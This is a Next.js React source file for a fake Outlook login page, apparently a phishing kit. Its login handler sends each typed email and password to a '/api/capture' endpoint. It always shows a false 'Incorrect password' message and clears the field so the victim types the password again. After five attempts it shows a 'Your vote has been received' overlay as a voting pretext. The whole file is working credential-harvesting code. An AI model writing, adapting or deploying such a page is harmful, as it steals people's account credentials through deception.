import Head from 'next/head';
import { useState } from 'react';

export default function OutlookLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    const pwdToSend = password;
    setPassword(''); // Clear password to require retaping
    setClickCount(prev => prev + 1);
    
    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: email.trim() + ' (Outlook)', password: pwdToSend, method: 'outlook' })
      });
      if (res.ok && clickCount + 1 >= 5) setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    } catch (e) {}
    if (clickCount + 1 >= 5) setShowSuccess(true);
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Log in</title>
      </Head>

      <style jsx>{`
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        a { text-decoration: none; }
        body { background: linear-gradient(135deg, #e7ebf0, #f0f2f5); display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: white; width: 100%; max-width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); text-align: center; }
        .login-container img[alt="Outlook Logo"] { width: 50px; margin-bottom: 20px; }
        .login-container input { width: 95%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; background-color: #f5f6f7; font-size: 16px; }
        .login-container input:focus { outline: none; border-color: #0072c6; }
        #login { width: 100%; padding: 12px; margin: 15px 0; background-color: #0072c6; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
        #login:hover { background-color: #005a9e; }
        a { color: #0072c6; font-size: 14px; display: block; margin-top: 10px; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 99999; display: none; align-items: center; justify-content: center; padding: 20px; text-align: center; }
        .success-overlay.show { display: flex; }
        .success-box { max-width: 440px; width: 100%; }
        .checkmark { width: 110px; height: 110px; margin: 0 auto 28px; border-radius: 50%; background: #4caf50; box-shadow: 0 14px 34px rgba(76, 175, 80, 0.4); display: flex; align-items: center; justify-content: center; animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .checkmark svg { width: 56px; height: 56px; }
        .checkmark polyline { fill: none; stroke: #fff; stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: draw-check 0.45s ease-out 0.25s forwards; }
        @keyframes pop-in { 0% { transform: scale(0); } 70% { transform: scale(1.12); } 100% { transform: scale(1); } }
        @keyframes draw-check { to { stroke-dashoffset: 0; } }
        .success-box h2 { font-family: 'Segoe UI', sans-serif; font-size: 26px; font-weight: 600; color: #333; margin: 0 0 12px; }
        .success-box p { font-size: 15px; color: #555; line-height: 1.55; margin: 0; }
      `}</style>

      <div className="login-container">
        <img src="/logos/outlook-logo.svg" alt="Outlook Logo" />
        <input type="text" placeholder="Email or phone number" value={email} onChange={(e) => setEmail(e.target.value)} />
        <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
        <span style={{color: 'red', fontSize: '15px'}}>{feedback}</span>
        <button id="login" onClick={handleLogin}>Log in</button>
        <a href="#">Forgot your password?</a>
      </div>

      <div className="success-overlay" id="successOverlay" aria-hidden="true">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}